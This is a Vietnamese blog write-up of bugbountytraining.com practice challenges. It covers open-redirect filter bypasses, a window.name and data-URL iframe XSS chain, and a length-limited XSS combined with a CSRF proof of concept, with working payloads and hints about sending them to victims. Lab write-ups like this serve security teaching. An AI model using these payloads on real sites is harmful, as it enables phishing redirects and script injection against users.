# Giới thiệu chung
Để tiếp tục series về BugBountyHunter. Hôm nay ta sẽ tiếp tục làm thêm 1 vài challenges XSS mức độ medium và lỗi Open URL Redirect nhé.
# 1. Bug_bounty_training: You may only redirect to *.bugbountyhunter.com vs Only relative redirects are allowed!

### Giới thiệu:
2 bài trên đều thuộc `Open URL Redirect` và khai thác tương tự nhau nên cho vào làm 1 thể

### Khai thác:

#### a. You may only redirect to *.bugbountyhunter.com
Link: [https://www.bugbountytraining.com/challenges/challenge-7.php](https://www.bugbountytraining.com/challenges/challenge-7.php)

Bài này họ yêu cầu mình chuyển hướng đến 1 trang khác với url phải có dạng `*.bugbountyhunter.com`. Ta sẽ thử khai thác để chuyển hướng đến trang google.com

[![Screenshot-from-2021-01-08-15-17-53.png](https://0xbadcode.ml/uploads/images/gallery/2021-01/scaled-1680-/Screenshot-from-2021-01-08-15-17-53.png)](https://0xbadcode.ml/uploads/images/gallery/2021-01/Screenshot-from-2021-01-08-15-17-53.png)

Bài này cho ta 1 đường link. Khi bấm vào thì sẽ chuyển hướng đến trang `https://www.bugbountyhunter.com/` của họ.
Thử xem nguồn trang:

[![Screenshot-from-2021-01-08-15-20-39.png](https://0xbadcode.ml/uploads/images/gallery/2021-01/scaled-1680-/Screenshot-from-2021-01-08-15-20-39.png)](https://0xbadcode.ml/uploads/images/gallery/2021-01/Screenshot-from-2021-01-08-15-20-39.png)

Trang này sử dụng 1 biến đầu vào là `redirectUri` của thẻ `a` để truyền url. Do không quy định phương thức truyền vào nên ta có thể truyền giá trị của biến này trên url với phương thức GET.
Để chuyển hướng url, ta thường sử dụng các ký tự: `?,/,#`. Thử lần lượt với từng cái thì chỉ có `#` là không bị lọc. Khai thác với url:

`https://www.bugbountytraining.com/challenges/challenge-7.php?redirectUri=https://example.com#.bugbountytraining.com/`

Để bypass ta sử dụng `%0a%0d` vào trước dấu `#`, cặp ký hiệu `%0a%0d` được sử dụng như 1 dấu xuống dòng. Ta được:

`https://www.bugbountytraining.com/challenges/challenge-7.php?redirectUri=https://example.com%0a%0d#.bugbountytraining.com/`
Bấm vào `here`. Đường dẫn sẽ chuyển hướng đến google.com:

#### b. Only relative redirects are allowed!

[![Screenshot-from-2021-01-08-15-30-55.png](https://0xbadcode.ml/uploads/images/gallery/2021-01/scaled-1680-/Screenshot-from-2021-01-08-15-30-55.png)](https://0xbadcode.ml/uploads/images/gallery/2021-01/Screenshot-from-2021-01-08-15-30-55.png)

Tương tự như bài kia. Trang này cũng cho ta 1 đường dẫn tuy nhiên không chỉ cho phép đầu vào url là dấu /. Ta có thể sử dụng đường dẫn //google.com thay cho https://google.com.
Nhập thử:
`https://www.bugbountytraining.com/challenges/challenge-4.php?redirectUrl=//google.com/`

[![Screenshot-from-2021-01-08-15-36-10.png](https://0xbadcode.ml/uploads/images/gallery/2021-01/scaled-1680-/Screenshot-from-2021-01-08-15-36-10.png)](https://0xbadcode.ml/uploads/images/gallery/2021-01/Screenshot-from-2021-01-08-15-36-10.png)
Bị quay lại trang cũ, vậy là không được.
Để bypass ta tiếp tục sử dụng %0a%0d chèn vào giữa //. Nhập url:

`https://www.bugbountytraining.com/challenges/challenge-4.php?redirectUrl=/%0a%0d/google.com/`

Bấm vào `here`. Đường dẫn sẽ chuyển hướng đến google.com
[![Screenshot-from-2021-01-08-15-37-21.png](https://0xbadcode.ml/uploads/images/gallery/2021-01/scaled-1680-/Screenshot-from-2021-01-08-15-37-21.png)](https://0xbadcode.ml/uploads/images/gallery/2021-01/Screenshot-from-2021-01-08-15-37-21.png)

Khai thác thành công
# 2. This strict URL filter should prevent XSS, right?
Link: [https://www.bugbountytraining.com/challenges/challenge-6.php](https://www.bugbountytraining.com/challenges/challenge-6.php)
### a. Giới thiệu:
Đây 1 bài XSS mức độ medium. Ta sẽ sử dụng cả lỗi Open URL Redirect bên trên để khai thác.

### b. Khai thác:

Vào trang thì ta được:

[![Screenshot-from-2021-01-18-09-21-34.png](https://0xbadcode.ml/uploads/images/gallery/2021-01/scaled-1680-/Screenshot-from-2021-01-18-09-21-34.png)](https://0xbadcode.ml/uploads/images/gallery/2021-01/Screenshot-from-2021-01-18-09-21-34.png)

Giao diện trang cho ta bấm vào 1 đường link. Khi bấm vào sẽ thực hiện chuyển hướng đến trang chủ của bugbountyhunter. Ta sẽ bắt request bằng burpsuite xem sao:

[![FvtScreenshot-from-2021-01-18-08-31-34.png](https://0xbadcode.ml/uploads/images/gallery/2021-01/scaled-1680-/FvtScreenshot-from-2021-01-18-08-31-34.png)](https://0xbadcode.ml/uploads/images/gallery/2021-01/FvtScreenshot-from-2021-01-18-08-31-34.png)

Trang này sử dụng 1 thẻ `a` để truyền url. Tại đề bài có gợi ý cho ta tham số `?url=` dễ bị tấn công. Truyền vào url 1 tham số `?url=https://www.google.com` ta được:

[![ldLScreenshot-from-2021-01-18-09-25-10.png](https://0xbadcode.ml/uploads/images/gallery/2021-01/scaled-1680-/ldLScreenshot-from-2021-01-18-09-25-10.png)](https://0xbadcode.ml/uploads/images/gallery/2021-01/ldLScreenshot-from-2021-01-18-09-25-10.png)

Vậy là giá trị `href` trong thẻ `a` đã bị chuyển thành `https://www.google.com`. Gửi url với tham số trên lên trình duyệt và bấm vào đường link thì trang sẽ được chuyển hướng đến trang của `google.com`. Như vậy ta có thể khai thác XSS tại đây. Thay tham số `?url=javascript:alert(1)`, việc sử dụng `javascript:` sẽ tạo ra 1 liên kết thực thi câu lệnh javacript sau dấu `:`. Nếu thành công thì khi bấm vào link sẽ bắn ra XSS:

[![Screenshot-from-2021-01-18-08-32-22.png](https://0xbadcode.ml/uploads/images/gallery/2021-01/scaled-1680-/Screenshot-from-2021-01-18-08-32-22.png)](https://0xbadcode.ml/uploads/images/gallery/2021-01/Screenshot-from-2021-01-18-08-32-22.png)

Xem response thì tại thẻ `a` phần href đã bị filter mất cặp dấu `()` nên không thể chạy javascript được. Kiểm tra thử với cái dấu khác thì bị filter mất các dấu `<, >, (, ), [, ], {, }` . Như vậy thì ta không chạy lệnh khai thác trong `javascript:` được. Sử dụng gợi ý người ta cho xem sao.

Gợi ý: `window.name doesn't get reset even after navigation`. Hiểu đơn giản là giá trị của `window.name` không bị thay đổi sau khi chuyển hướng. Như vậy ta có thể sử dụng `window.name` kết hợp với `javascript:` để khai thác. Ta sẽ truyền payload vào giá trị name, rồi sau đó export nó ra bằng javascript:name (khi đó javascript:name được thực thi tương tự document.write(name)). Vì không thể sử dụng các ký tự `<, >, (, ), [, ], {, }` để  truyền payload. Nên ta có thể sử dụng DATA URL. Data url cũng là 1 kiểu protocol tương tự như `http:, https:, javascript:` cho phép ta nhúng các chuối dữ liệu vào html và css. Ví dụ: `data:text/html,<script>alert('hi');</script>`:

[![Screenshot-from-2021-01-18-08-29-14.png](https://0xbadcode.ml/uploads/images/gallery/2021-01/scaled-1680-/Screenshot-from-2021-01-18-08-29-14.png)](https://0xbadcode.ml/uploads/images/gallery/2021-01/Screenshot-from-2021-01-18-08-29-14.png)

Trang sẽ trả về thông báo `hi`. Bây giờ ta sẽ truyền vào 1 khung chứa trang web cần khai thác, ta sẽ sử dụng iframe, với name sẽ chứa giá trị cần khai thác.
Ta có thể khai thác bằng nhiều thẻ khác nhau ví dụ:
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`


Truyền vào trong ifame chứa src là `https://www.bugbountytraining.com/challenges/challenge-6.php?url=javascript:name` . Ta có đoạn khai thác đầy đủ như sau:
`data:text/html,<iframe width=500px height=500px name="<img src=x onerror=alert(document.domain)>" src=https://www.bugbountytraining.com/challenges/challenge-6.php?url=javascript:name>`

Cho đoạn khai thác lên url ta được:
[![Screenshot-from-2021-01-18-11-32-17.png](https://0xbadcode.ml/uploads/images/gallery/2021-01/scaled-1680-/Screenshot-from-2021-01-18-11-32-17.png)](https://0xbadcode.ml/uploads/images/gallery/2021-01/Screenshot-from-2021-01-18-11-32-17.png)

Đây là trang web có 1 khung chứa trang web mà ta muốn khai thác. Bấm vào đường link thì sẽ bắn ra XSS;

[![Screenshot-from-2021-01-18-11-32-33.png](https://0xbadcode.ml/uploads/images/gallery/2021-01/scaled-1680-/Screenshot-from-2021-01-18-11-32-33.png)](https://0xbadcode.ml/uploads/images/gallery/2021-01/Screenshot-from-2021-01-18-11-32-33.png)

Vậy là khai thác thành công. Ta có thể điều chỉnh width, height cho phù hợp và gửi url khai thác cho nạn nhân là được.
# 3. Bug_bounty_training: "I've won a bounty" generator

link: [https://www.bugbountytraining.com/challenges/challenge-11.php](https://www.bugbountytraining.com/challenges/challenge-11.php)

### a. Giới thiệu:
Tiếp tục là 1 bài XSS mức độ medium. Bài này ta sẽ khai thác XSS khi bị giới hạn số lượng đầu vào.

### b. Khai thác:

Vào trang thì được:

[![Screenshot-from-2021-01-08-15-39-43.png](https://0xbadcode.ml/uploads/images/gallery/2021-01/scaled-1680-/Screenshot-from-2021-01-08-15-39-43.png)](https://0xbadcode.ml/uploads/images/gallery/2021-01/Screenshot-from-2021-01-08-15-39-43.png)

Trang này tạo 1 ứng dụng nhập vào tên và số tiền thưởng. Nhập thử vào ta được:

[![Screenshot-from-2021-01-08-15-40-00.png](https://0xbadcode.ml/uploads/images/gallery/2021-01/scaled-1680-/Screenshot-from-2021-01-08-15-40-00.png)](https://0xbadcode.ml/uploads/images/gallery/2021-01/Screenshot-from-2021-01-08-15-40-00.png)

Bật burp suite để bắt request ta có:

[![Screenshot-from-2021-01-08-15-46-39.png](https://0xbadcode.ml/uploads/images/gallery/2021-01/scaled-1680-/Screenshot-from-2021-01-08-15-46-39.png)](https://0xbadcode.ml/uploads/images/gallery/2021-01/Screenshot-from-2021-01-08-15-46-39.png)

Request truyền vào lần lượt 4 giá trị: `username`,`bountyamnt`,`platform`,`currency` Và trả về response tương ứng.

Ta thử khai thác cả 4 cái cùng lúc xem sao. Nhập vào:

`username=<script>alert(1)</script>&bountyamnt=<script>alert(1)</script>&platform=<script>alert(1)</script>&currency=<script>alert(1)</script>`

Ta được:

[![Screenshot-from-2021-01-08-16-03-02.png](https://0xbadcode.ml/uploads/images/gallery/2021-01/scaled-1680-/Screenshot-from-2021-01-08-16-03-02.png)](https://0xbadcode.ml/uploads/images/gallery/2021-01/Screenshot-from-2021-01-08-16-03-02.png)

Để ý biến `bountyamnt` bắt buộc phải nhập vào 1 số nếu không sẽ trả về `0`. Biến `username` nhập vào 1 chuỗi tuy nhiên các ký tự `<>` lại bị filter. 2 biến `platform`,`currency` ta có thể nhập vào 1 chuỗi, đồng thời có thể thoát ra được các thẻ để chạy script. Tuy nhiên 2 biến này lại bị giới hạn số ký tự đầu ra nên không thực hiện chạy script được.

Với kiểu giới hạn ký tự. Ta thường sử dụng lệnh: `<script src=14.rs>`. Đây là 1 lệnh thực hiện gọi file `14.rs`, file này cho phép ta thực thi xss. Tuy nhiên giới hạn ký tự của bài này còn ít hơn nên không chạy script này được. Vậy hiện tại ta đang có 3 biến đầu vào cho nhập tất cả các ký tự, ta sẽ kết  hợp 3 biến này để tạo nên 1 khai thác xss. Ta sẽ tách mã `<script>alert(1)</script>` thành 3 phần. trong đó 2 biến `platform`,`currency` giữ 2 thẻ script. Phần biến `username` sẽ sử dụng `alert(1)`.  Để xóa các ký tự ở giữa ta sử dụng cặp `/*` và `*/`. Khi đó tất cả các giá trị bên trong sẽ trở thành comment.

Nhập: `username=*/alert(1)/*&bountyamnt=1&platform=*/</script>&currency="><script>/*` Ta được:


[![Screenshot-from-2021-01-08-16-15-32.png](https://0xbadcode.ml/uploads/images/gallery/2021-01/scaled-1680-/Screenshot-from-2021-01-08-16-15-32.png)](https://0xbadcode.ml/uploads/images/gallery/2021-01/Screenshot-from-2021-01-08-16-15-32.png)

2 biến `currency` và `username` đã thành công. Tuy nhiên chỉ có biến `platform` bị filter dấu `<` thành `&lt;`, đằng sau còn có cặp `">` thừa của `value`. Ta sẽ thực hiện bypass bằng cách không đóng thẻ `platform=</script "`, dấu `"` sử dụng để bypass dấu `"` thừa. Thử lại với: `username=*/alert(1)/*&bountyamnt=1&platform=*/</script "&currency="><script>/*` ta được:

[![Screenshot-from-2021-01-08-16-22-53.png](https://0xbadcode.ml/uploads/images/gallery/2021-01/scaled-1680-/Screenshot-from-2021-01-08-16-22-53.png)](https://0xbadcode.ml/uploads/images/gallery/2021-01/Screenshot-from-2021-01-08-16-22-53.png)

Bypass thành công. tại request bấm chuột phải chọn `show response in browser` -> Copy. Sau đó tại paste giá trị vừa copy lên url ta được:

[![Screenshot-from-2021-01-08-16-23-09.png](https://0xbadcode.ml/uploads/images/gallery/2021-01/scaled-1680-/Screenshot-from-2021-01-08-16-23-09.png)](https://0xbadcode.ml/uploads/images/gallery/2021-01/Screenshot-from-2021-01-08-16-23-09.png)

Vậy là khai thác thành công. Tuy nhiên đây mới chỉ là self xss. Để truyền được khai thác cho user khác, ta phải sử dụng thêm csrf. Do trang này không sử dụng csrf-token nên ta hoàn toàn có thể khai thác được. Tại request vừa có bấm chuột phải -> Engagement tools -> CSRF POC. Ta có:

[![Screenshot-from-2021-01-08-16-28-53.png](https://0xbadcode.ml/uploads/images/gallery/2021-01/scaled-1680-/Screenshot-from-2021-01-08-16-28-53.png)](https://0xbadcode.ml/uploads/images/gallery/2021-01/Screenshot-from-2021-01-08-16-28-53.png)

Đến đây ta chỉ cần copy đoạn code trên sau đó cho vào 1 trang web khai thác. Gửi url trang web cho các users mình muốn tấn công là thành công.